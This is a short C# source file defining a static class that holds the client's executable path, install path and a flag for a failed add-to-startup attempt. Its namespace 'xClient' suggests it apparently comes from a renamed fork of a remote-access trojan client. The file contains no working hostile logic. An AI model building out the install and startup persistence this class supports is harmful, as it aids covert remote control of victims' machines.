using System.Windows.Forms;

namespace xClient.KuuhakuÇekirdek.Veri
{
    public static class ClientVerisi
    {
        static ClientVerisi()
        {
            CurrentPath = Application.ExecutablePath;
        }

        public static string CurrentPath { get; set; }
        public static string InstallPath { get; set; }
        public static bool AddToStartupFailed { get; set; }
    }
}